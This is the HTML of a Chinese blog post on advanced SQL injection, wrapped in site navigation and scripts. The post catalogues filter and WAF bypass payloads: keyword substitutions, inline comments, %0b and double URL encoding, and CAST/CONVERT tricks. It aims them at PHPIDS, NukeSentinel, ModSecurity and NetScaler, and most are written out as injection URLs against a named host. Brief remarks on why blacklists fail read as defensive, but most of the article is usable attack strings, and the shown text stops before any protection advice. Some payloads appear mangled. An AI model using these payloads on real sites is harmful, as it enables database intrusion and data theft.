@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>高级SQL注入：混淆和绕过 | Elapse&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="keywords" content="网络安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="高级SQL注入：混淆和绕过">
+<meta property="og:url" content="https://Ernket.github.io/2019/10/02/高级SQL注入：混淆和绕过/index.html">
+<meta property="og:site_name" content="Elapse&#39;s Blog">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-02-06T07:22:50.240Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="高级SQL注入：混淆和绕过">
+  
+    <link rel="alternative" href="/atom.xml" title="Elapse&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Elapse</a></h1>
+        </hgroup>
+        
+        <p class="header-subtitle">生命的质感和构造，即存在本身</p>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="/xxxxx" title="github">github</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Python/" style="font-size: 16px;">Python</a> <a href="/tags/linux/" style="font-size: 18px;">linux</a> <a href="/tags/windows/" style="font-size: 14px;">windows</a> <a href="/tags/工具/" style="font-size: 10px;">工具</a> <a href="/tags/总结/" style="font-size: 10px;">总结</a> <a href="/tags/游戏/" style="font-size: 10px;">游戏</a> <a href="/tags/网络安全/" style="font-size: 20px;">网络安全</a> <a href="/tags/虚拟化/" style="font-size: 10px;">虚拟化</a> <a href="/tags/逆向破解/" style="font-size: 12px;">逆向破解</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://xqinger.com/">没有感情的虎神</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.asolmn.top/">运维大佬灏神</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://rj45mp.github.io/">安全巨佬大佬Rj45</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://betao.cn">Tao&#39;s blog</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">刻薄，惰于交流，往往疏离，孤独执着，生来淡漠，拥有的亦不比旁人多</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Elapse</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Elapse</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">生命的质感和构造，即存在本身</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="/xxxxx" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-高级SQL注入：混淆和绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2019/10/02/高级SQL注入：混淆和绕过/" class="article-date">
+      <time datetime="2019-10-02T14:05:19.000Z" itemprop="datePublished">2019-10-02</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      高级SQL注入：混淆和绕过
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><pre><code>【0×00】 – 简介
+【0×01】 – 过滤规避（Mysql）
+【0x01a】 – 绕过函数和关键词的过滤
+【0x01b】 – 绕过正则表达式过滤
+【0×02】 – 常见绕过技术
+【0×03】 – 高级绕过技术
+</code></pre><h2 id="【0×01】-–-简介"><a href="#【0×01】-–-简介" class="headerlink" title="【0×01】 – 简介"></a>【0×01】 – 简介</h2><p>大家好，这是一篇致力于文档化我们所从事的高级SQL注入技术的文章。</p>
+<p>本文将要揭示能用于现实CMSs和WAFs程序中的高级绕过技术和混淆技术。文中所提到的SQL注入语句仅仅是一些绕过保护的方法。还有一些其他的技术能用于攻击WEB程序，但是很不幸我们不能告诉你，因为它们就是0day。不论如何，本文旨在揭示现实世界中没有完全彻底的安全系统即使你在一个WAF上面花费了三十万美元。</p>
+<p>本文分为7个章节，仅有0×01到0×03章节是介绍技术内容的。<br>0×01章节我们将详细介绍关于如何绕过基本的函数和关键词过滤。0×02章节我们将给出常见的绕过技术用于绕过开源和商业性的WAF。0×03章节我们将分两个小节来深入探讨高级绕过技术：“HTTP参数污染：分离和结合”和“HTTP参数参杂”。0×04章节我们将指导如何用正确的解决方案保护你的网站。在最后的0×05章节是对0×01到0×04章节的总结。</p>
+<h2 id="【0×01】-过滤规避（Mysql）"><a href="#【0×01】-过滤规避（Mysql）" class="headerlink" title="【0×01】 -过滤规避（Mysql）"></a>【0×01】 -过滤规避（Mysql）</h2><p>本节将阐述基于PHP和MySQL的过滤规避行为以及如何绕过过滤。过滤规避是一种用来防止SQL注入的技术。这种技术可以用SQL函数，关键词过滤或者正则表达式完成。这就意味着过滤规避严重依赖如何储存一个黑名单或者正则表达式。如果黑名单或者正则表达式没有覆盖每一个注入情境，那么WEB程序对于SQL注入攻击来说仍旧是脆弱的。</p>
+<h3 id="【0x01a】-–-绕过函数和关键词过滤"><a href="#【0x01a】-–-绕过函数和关键词过滤" class="headerlink" title="【0x01a】 – 绕过函数和关键词过滤"></a>【0x01a】 – 绕过函数和关键词过滤</h3><p>函数和关键词过滤使用函数和关键词黑名单来保护WEB程序免受攻击。如果一个攻击者提交了一个包含在黑名单中的关键词或者SQL函数的注入代码，这个攻击便会失效。然而，如果攻击者能够巧妙使用其他的关键词或者函数来操作注入，那么黑名单将无法阻止攻击。为了阻止攻击大量的关键词和函数必须放到黑名单中。但是这也影响了用户，当用户想提交一个存在黑名单中的单词时，用户将无法提交，因为这个单词已被黑名单过滤。接下来的情境展示了一些使用函数和关键词过滤以及绕过技术的例子。</p>
+<p>关键词过滤：</p>
+<pre><code>and,or
+</code></pre><hr>
+<p>PHP过滤代码:</p>
+<pre><code>preg_match(‘/(and|or)/I’,$id)
+</code></pre><p>关键词and,or常被用做简单测试网站是否容易进行注入攻击。这里给出简单的绕过使用&amp;&amp;,||分别替换and,or。</p>
+<pre><code>过滤注入：            1 or 1 = 1    1 and 1 = 1
+绕过注入：            1 || 1 = 1    1 &amp;&amp; 1 = 1
+</code></pre><hr>
+<p>关键词过滤：</p>
+<pre><code>and,or,union
+</code></pre><hr>
+<p>PHP过滤代码：</p>
+<pre><code>preg_match (‘/(and|or|union)/I’,$id)
+</code></pre><p>关键词union通常被用来构造一个恶意的语句以从数据库中获取更多数据。</p>
+<pre><code>过滤注入：            union  select  user, password  from  users
+绕过注入：            1 || （select  user  from  users  where  user_id = 1）=’admin’
+** 注意：你必须知道表名，列名和一些表中的其他数据，否则你必须用别的语句从information_schema.columns中获取。
+</code></pre><p>举例，使用substring函数获取表名的每一个字符。</p>
+<hr>
+<p>关键词过滤：</p>
+<pre><code>and,or,union,where
+</code></pre><hr>
+<p>PHP过滤代码：</p>
+<pre><code>preg_match(‘/(and|or|union|where)/I’,$id)
+</code></pre><hr>
+<p>过滤注入：</p>
+<pre><code>1||（select  user  from  users  where  user_id = 1）= ‘admin’
+</code></pre><p>绕过注入：</p>
+<pre><code>1||( select  user  from  users  limit  1)=’admin’
+</code></pre><hr>
+<p>关键词过滤:</p>
+<pre><code>and,or,union,where,limit
+</code></pre><hr>
+<p>PHP过滤代码：</p>
+<pre><code>preg_match(‘/(and|or|union|where|limit)/I’,$id)
+</code></pre><p>过滤注入：</p>
+<pre><code>1||（select  user  from  users  limit  1）=’admin’
+</code></pre><p>绕过注入：</p>
+<pre><code>1||（select  user  from  users  group by user_id having user_id=1 ）= ‘admin’
+</code></pre><hr>
+<p>关键词过滤：</p>
+<pre><code>and,or,union,where,limit,group by
+</code></pre><hr>
+<p>PHP过滤代码：</p>
+<pre><code>preg_match(‘/(and|or|union|where|limit|group by)/I’,$id)
+</code></pre><p>过滤注入：</p>
+<pre><code>1||（select  user  from  users  group  by  user_id  having  user_id  =1）=’admin’
+</code></pre><p>绕过注入：</p>
+<pre><code>1||（select  substr(group_concat(user_id),1,1) user  from  users  )=1
+</code></pre><hr>
+<p>关键词过滤：</p>
+<pre><code>and,or,union,where,limit,group by,select,’
+</code></pre><hr>
+<p>PHP过滤代码：</p>
+<pre><code>preg_match(‘/(and|or|union|where|limit|group by|select|\’)/I’,$id
+</code></pre><p>过滤注入：</p>
+<pre><code>1||（select substr(group_concat(usr_id),1,1)user from users =1
+</code></pre><p>绕过注入：</p>
+<pre><code>1|| user_id is not null
+</code></pre><p>绕过注入：</p>
+<pre><code>1||substr(user,1,1)=0×61
+</code></pre><p>绕过注入：</p>
+<pre><code>1||substr(user,1,1)=unhex(61)
+</code></pre><hr>
+<p>关键词过滤：</p>
+<pre><code>and,or,union,where,limit,goup by,select,’,hex,
+</code></pre><p>—————————————————————————————–</p>
+<p>PHP过滤代码：</p>
+<pre><code>preg_match(‘/(and|or|union|where|limit|group by|select|\’|hex)/I’,$id)
+</code></pre><p>过滤注入：</p>
+<pre><code>1||substr(user,1,1)=unhex(61)
+</code></pre><p>绕过注入：</p>
+<pre><code>1||substr(user,1,1)=lower(conv(11,10,36))
+</code></pre><hr>
+<p>关键词过滤：</p>
+<pre><code>and,or,union,where,limit,group by,select,’,hex,substr
+</code></pre><p>——————————————————————————————-</p>
+<p>PHP过滤代码：</p>
+<pre><code>preg_match(‘/(and|or|union|where|limit|group by|select|\’|hex|substr)/I’,$id)
+</code></pre><p>过滤注入：</p>
+<pre><code>1||substr(user,1,1)=lower(conv(11,10,36))
+</code></pre><p>绕过注入：</p>
+<pre><code>1||lpad(user,7,1)
+</code></pre><hr>
+<p>关键词过滤：</p>
+<pre><code>and,or,union,where,limit,group by,select,’,hex,substr,white space
+</code></pre><hr>
+<p>PHP过滤代码：</p>
+<pre><code>preg_match(‘/(and|or|union|where|limit|group by|select|\’|hex|substr|\s)/I’,$id)
+</code></pre><p>过滤注入：</p>
+<pre><code>1||lpad(user,7,1)
+</code></pre><p>绕过注入：</p>
+<pre><code>1%0b||%0blpad(user,7,1)
+</code></pre><hr>
+<p>从上面的例子中我们可以看出有大量的SQL语句可以用来绕过黑名单，虽然黑名单已经包含了很多关键词和函数，此外，还有数不清的例子中没有提到的SQL语句可以用来绕过黑名单。<br>建立一个更大的黑名单不是一个保护你网站的好注意。记住，过滤的关键词和函数越多，对用户越不友好。</p>
+<h3 id="【0x01b】-–-绕过正则表达式过滤"><a href="#【0x01b】-–-绕过正则表达式过滤" class="headerlink" title="【0x01b】 – 绕过正则表达式过滤"></a>【0x01b】 – 绕过正则表达式过滤</h3><p>正则表达式过滤是一个比关键词和函数过滤要好的阻止SQL注入的方法，因为它使用模式匹配来检测攻击。但是，很多正则表达式仍然能被绕过。下面以开源软件PHPIDS 0.6举例阐明用来绕过正则表达式的注入脚本。</p>
+<p>PHPIDS通常阻止包含=,（或者’ 跟随一个字符串或者整数输入，比如1 or 1=1，1 or ’1’，1 or char(97)。但是，它能被使用不包含=，（或者’符号的语句绕过。</p>
+<hr>
+<p>过滤注入：</p>
+<pre><code>1 or 1 = 1
+</code></pre><p>绕过注入：</p>
+<pre><code>1 or 1
+</code></pre><hr>
+<p>过滤注入：</p>
+<pre><code>1 union select 1, table_name from information_schema.tables where table_name=’users’
+</code></pre><p>过滤注入：</p>
+<pre><code>1 union select 1,table_name from information_schema.tables where table_name between ‘a’ and ‘z’
+</code></pre><p>过滤注入：</p>
+<pre><code>1 union select 1,table_name from information_schema.tables where table_name between char(97) and char(122)
+</code></pre><p>绕过注入：</p>
+<pre><code>1 union select 1,table_name from information_schema.tables where table_name between 0x61 and 0x7a
+</code></pre><p>绕过注入：</p>
+<pre><code>1 union select 1,table_name from information_schema.tables where table_name like 0x7573657273
+</code></pre><h2 id="【0x02】-常见绕过技术"><a href="#【0x02】-常见绕过技术" class="headerlink" title="【0x02】 - 常见绕过技术"></a>【0x02】 - 常见绕过技术</h2><p>在这个章节，我们将提到关于绕过WEB应用防护系统(WAF)的技术。首先我们需要认识一下什么是WAF。</p>
+<p>WEB应用防护系统（WAF）是一套设备，服务扩展或者过滤器，对HTTP会话应用一系列的规则。一般来说，这些规则包含了常见的攻击比如跨站脚本攻击（XSS）和SQL注入攻击。很多攻击可以通过制定符合自己程序的规则来识别和阻挡。花时间实现定制规则是有重要意义的，而且当WEB程序改变时需要维护。</p>
+<p>WAF通常被称做“深层次数据包检测防火墙”，它们检查HTTP/HTTPS/SOAP/XML-RPC/WEB服务在内的每一个请求和相应。一些现代的WAF系统同时检查攻击特征和异常行为。<br>现在让我们赶紧来了解如何用混淆技术来破坏WAF吧，只要花时间去理解它的规则以及运用你的想象所有WAF都能被绕过！</p>
+<p>用注释来绕过</p>
+<p>SQL注释能让我们绕过许多绕过和WAF</p>
+<pre><code>http://croot.cnblogs.com/news.php?id+un/**/ion+se/**/lect+1,2,3--
+</code></pre><p>变换大小写<br>某些WAF仅过滤小写的SQL关键词<br>正则表达式过滤：/union\sselect/g</p>
+<pre><code>http://croot.cnblogs.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3--
+</code></pre><p>替换关键词<br>某些程序和WAF用preg_replace函数来去除所有的SQL关键词。那么我们能简单的绕过。</p>
+<pre><code>http://croot.cnblogs.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--
+</code></pre><p>某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用“%0b”来绕过。</p>
+<pre><code>http://croot.cnblogs.com/news.php?id=1+uni%0bon+se%0blect+1,2,3--
+</code></pre><p>对于Mod_rewrite：</p>
+<pre><code>注释“/**/”不能绕过，那么我们用“%0b”代替“/**/”。
+</code></pre><p>被禁止的：</p>
+<pre><code>http://croot.cnblogs.com/main/news/id/1/**/||/**/lpad(first_name,7,1).html
+</code></pre><p>绕过：</p>
+<pre><code>http://croot.cnblogs.com/main/news/id/1%0b||%0blpad(first_name,7,1).html
+</code></pre><p>字符编码</p>
+<p>大多CMS和WAF将对程序的输入进行解码和过滤，但是某些WAF仅对输入解码一次，那么双重加密就能绕过某些过滤，这时WAF对输入进行一次解码并过滤与此同时程序继续解码且执行SQL语句。</p>
+<pre><code>http://croot.cnblogs.com/news.php?id=1%252f%252a*/union%252f%252a/select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--
+</code></pre><p>此外，这些技术结合起来可以绕过Citrix NetScaler</p>
+<pre><code>-去除所有“NULL”字符
+-在某些部分使用查询编码
+-去除单引号字符“’”
+-爽去吧！
+</code></pre><p>归功于：Wendel Guglielmetti Henrique 和 Armorlogic Profense 较早的通过URL编码换行符绕过2.4.4</p>
+<h1 id="现实例子"><a href="#现实例子" class="headerlink" title="现实例子"></a>现实例子</h1><p>NukeSentinel （Nuke Evolution）</p>
+<pre><code>// Check for UNION attack
+// Copyright 2004(c) Raven PHP Scripts
+$blocker_row = $blocker_array[1];
+if($blocker_row[&#39;activate&#39;] &gt; 0) {
+if (stristr($nsnst_const[&#39;query_string&#39;],&#39;+union+&#39;) OR \
+stristr($nsnst_const[&#39;query_string&#39;],&#39;%20union%20&#39;) OR \
+stristr($nsnst_const[&#39;query_string&#39;],&#39;*/union/*&#39;) OR \
+stristr($nsnst_const[&#39;query_string&#39;],&#39; union &#39;) OR \
+stristr($nsnst_const[&#39;query_string_base64&#39;],&#39;+union+&#39;) OR \
+stristr($nsnst_const[&#39;query_string_base64&#39;],&#39;%20union%20&#39;) OR \
+stristr($nsnst_const[&#39;query_string_base64&#39;],&#39;*/union/*&#39;) OR \
+stristr($nsnst_const[&#39;query_string_base64&#39;],&#39; union &#39;)) {  // block_ip($blocker_row);
+die(&quot;BLOCK IP 1 &quot; );
+}
+}
+</code></pre><p>我们能利用下面脚本绕过它的过滤：</p>
+<p>禁止：</p>
+<pre><code>http://croot.cnblogs.com/php-nuke/?/**/union/**/select?..
+</code></pre><p>绕过：</p>
+<pre><code>http://croot.cnblogs.com/php-nuke/?/%2A%2A/union/%2A%2A/select?
+</code></pre><p>绕过：</p>
+<pre><code>http://croot.cnblogs.com/php-nuke/?%2f**%2funion%2f**%2fselect
+</code></pre><p>我们可以利用下面代码绕过它的过滤：</p>
+<pre><code>http://croot.cnblogs.com/news.php?id=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
+</code></pre><p>从这个攻击，我们可以绕过Mod Security。让我们看看发生了什么！！<br>MySQL Server支持3中注释风格：</p>
+<pre><code>-从#字符开始到这一行的末尾
+-从--序列开始到这一行的末尾
+-从/*序列到下一个*/之间，如同C语言
+此语法能够使注释延伸到多行，因为开始序列和闭合序列不必在同一行。
+下面的例子我们用“%0D%0A”作为换行符。让我们看看第一个请求（获取DB 用户）。SQL数据的结果看起来类似如下：
+0 div 1 union #foo*/*/bar
+select#foo
+1,2,current_user
+然而当SQL数据被MySQL DB执行的时候类似如下：
+0 div 1 union select 1,2,current_user
+缓冲区溢出
+用C语言写的WAF有溢出的倾向或者在装载一串数据时表现异常。
+给出一大串数据使我们的代码执行
+
+http://croot.cnblogs.com/news.php?id=1+and+(select 1)=(select 0x
+</code></pre><h1 id="高级绕过"><a href="#高级绕过" class="headerlink" title="高级绕过"></a>高级绕过</h1><p>常见的SQL过滤器类型</p>
+<p>在sql注入攻击的上下文中，您可能遇到的最有趣的过滤器是那些试图阻止包含以下一个或多个的输入的过滤器：</p>
+<pre><code>SQL关键字，例如SELECT，AND，INSERT
+特定的单个字符，例如引号或连字符
+空格
+</code></pre><p>您可能还会遇到过滤器而不是阻止包含前面列表中的项目的输入，尝试修改输入以使其安全，通过编码或转义有问题的字符或从输入中剥离违规项目并处理剩下的内容 顺便说一句，顺便说一句，这是不合逻辑的，因为如果有人想要损害你的Web应用程序，你想要处理他的恶意输入。</p>
+<p>通常，这些过滤器保护的应用程序代码容易受到SQL注入（因为全世界都存在无能，无知或收入不高的开发人员），并利用您需要的漏洞来找到一种避免过滤器传递恶意输入的方法 易受攻击的代码。 在接下来的几节中，我们将研究一些可以用来做的技术。</p>
+<h2 id="绕过SQL注入过滤器"><a href="#绕过SQL注入过滤器" class="headerlink" title="绕过SQL注入过滤器"></a>绕过SQL注入过滤器</h2><p>请注意，上述所有SQL注入过滤器绕过技术均基于黑名单过滤心态，而不是白名单过滤逻辑。这意味着糟糕的软件开发基于黑名单过滤器概念。</p>
+<p>通过SQL注入过滤器的方法很多，还有更多方法可以利用它们。回避SQL注入过滤器的最常见方法是：</p>
+<pre><code>使用大小写变化。
+使用SQL注释。
+使用URL编码。
+使用动态查询执行。
+使用空字节。
+嵌套剥离表达式。
+利用截断。
+使用非标准入口点。
+结合上述所有技术。
+</code></pre><h2 id="大小写变化"><a href="#大小写变化" class="headerlink" title="大小写变化"></a>大小写变化</h2><p>如果关键字阻塞过滤器特别天真，您可以通过改变攻击字符串中字符的大小来规避它，因为数据库以不区分大小写的方式处理SQL关键字。 例如，如果阻止以下输入：</p>
+<pre><code>&#39;UNION SELECT @@ version --
+</code></pre><p>您可以使用以下替代方法绕过过滤器：</p>
+<pre><code>&#39;UnIoN sElEcT @@ version --
+</code></pre><p>注意：仅使用大写或仅使用小写也可以使用，但我不建议在这种类型的模糊测试中花费大量时间。</p>
+<h2 id="SQL注释"><a href="#SQL注释" class="headerlink" title="SQL注释"></a>SQL注释</h2><p>您可以使用内联注释序列来创建SQL的片段，这些片段在语法上不常见但完全有效，并绕过各种输入过滤器。 您可以通过这种方式规避各种简单的模式匹配过滤器。</p>
+<p>当然，您可以使用相同的技术来绕过过滤器，这些过滤器只会阻止任何空白区域。 许多开发人员错误地认为，通过将输入限制为单个令牌，他们正在阻止SQL注入攻击，忘记了内联注释使攻击者能够构造任意复杂的SQL而不使用任何空格。</p>
+<p>对于MySQL，您甚至可以在SQL关键字中使用内联注释，从而可以绕过许多常见的关键字阻止过滤器。 例如，如果后端数据库是MySQL，如果只检查SQL注入字符串的空格，则以下攻击仍然有效：</p>
+<pre><code>UNION//SELECT//@@version//-- Or &#39; U//NI//ON//SELECT//@@version//--
+</code></pre><p>注意：这种类型的滤波器旁路方法包括间隙填充和黑名单坏字符序列过滤。</p>
+<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>URL编码是一种多功能技术，可用于击败多种输入过滤器。 在最基本的形式中，这涉及用十六进制形式的ASCII代码替换有问题的字符，前面是％字符。 例如，单引号的ASCII代码为0x27，因此其URL编码表示为％27。在这种情况下，您可以使用以下攻击来绕过过滤器。</p>
+<p>原始查询：</p>
+<pre><code>NION SELECT @@version --
+</code></pre><p>URL编码的查询：</p>
+<pre><code>%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%40%40%76%65%72%73%69%6f%6e%20%2d%2d
+</code></pre><p>在其他情况下，这种基本的URL编码攻击不起作用，但您可以通过对被阻止的字符进行双URL编码来绕过过滤器。 在双重编码攻击中，原始攻击中的％字符本身以正常方式进行URL编码（如％25），因此单引号的双URL编码形式为％2527。 如果您修改前面的攻击以使用双URL编码，它看起来像这样：</p>
+<pre><code>%25%32%37%25%32%30%25%35%35%25%34%65%25%34%39%25%34%66%25%34%65%25
+%32%30%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32
+%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39
+%25%36%66%25%36%65%25%32%30%25%32%64%25%32%64
+</code></pre><p>注意：您还应该考虑选择性URL编码也是绕过SQL注入过滤的有效方法。</p>
+<p>双URL编码有时会起作用，因为Web应用程序有时会多次解码用户输入，并在最终解码步骤之前应用其输入过滤器。 在前面的示例中，涉及的步骤如下：</p>
+<pre><code>攻击者提供输入&#39;％252f％252a / UNION ...
+应用程序URL将输入解码为&#39;％2f％2a / UNION ...
+应用程序验证输入不包含/ *（它不包含）。
+应用程序URL将输入解码为&#39;/ ** / UNION ...
+应用程序在SQL查询中处理输入，并且攻击成功。
+</code></pre><p>URL编码技术的另一个变体是使用阻塞字符的Unicode编码。 除了使用带有两位十六进制ASCII码的％字符外，URL编码还可以使用各种Unicode字符表示形式。 unicode编码时的SQL注入查询如下所示：</p>
+<pre><code>27 20 55 4E 49 4F 4E 20 53 45 4C 45 43 54 20 40 40 76 65 72 73 69 6F 6E 20 2D 2D
+</code></pre><p>注意：我没有使用unicode编码进行大量实验，坦率地说，我不认为使用Unicode编码的fuzzing SQL会非常有用。</p>
+<h2 id="CAST和CONVERT关键字"><a href="#CAST和CONVERT关键字" class="headerlink" title="CAST和CONVERT关键字"></a>CAST和CONVERT关键字</h2><p>编码攻击的另一个子类是CAST和CONVERT攻击。 CAST和CONVERT关键字显式地将一种数据类型的表达式转换为另一种数据类型，通过CAST关键字将其嵌入到MySQL，MSSQL和Postgre数据库中。 它已被许多网站中的各种类型的恶意软件攻击使用，并且是一个非常有趣的SQL注入过滤器旁路。 使用此类攻击的最臭名昭着的僵尸网络是ASPRox僵尸网络病毒。 看看语法：</p>
+<p>使用 CAST</p>
+<pre><code>CAST ( expression AS data_type )
+</code></pre><p>使用 CONVERT</p>
+<pre><code>CONVERT ( data_type [ ( length ) ] , expression [ , style ] )
+</code></pre><p>使用CAST和CONVERT，您可以通过使用函数SUBSTRING传递结果进行类似的过滤，一个示例可以向您显示我的意思。 以下SQL查询将返回相同的结果：</p>
+<pre><code>SELECT SUBSTRING(&#39;CAST and CONVERT&#39;, 1, 4)
+</code></pre><p>返回结果：CAST</p>
+<pre><code>SELECT CAST(&#39;CAST and CONVERT&#39; AS char(4))
+</code></pre><p>返回结果：CAST</p>
+<pre><code>SELECT CONVERT(varchar,&#39;CAST&#39;,1)
+</code></pre><p>返回结果：CAST</p>
+<p>注意：请注意，SUBSTRING和CAST关键字的行为相同，也可用于盲SQL注入攻击。 您可以尝试使用此链接来测试此查询。 如果你想看到它，你必须在这个板上注册。）。</p>
+<p>进一步扩展CONVERT和CAST，我们可以确定以下SQL查询是否有效且非常有趣，请参阅如何使用CAST和CONVERT提取MSSQL数据库版本。</p>
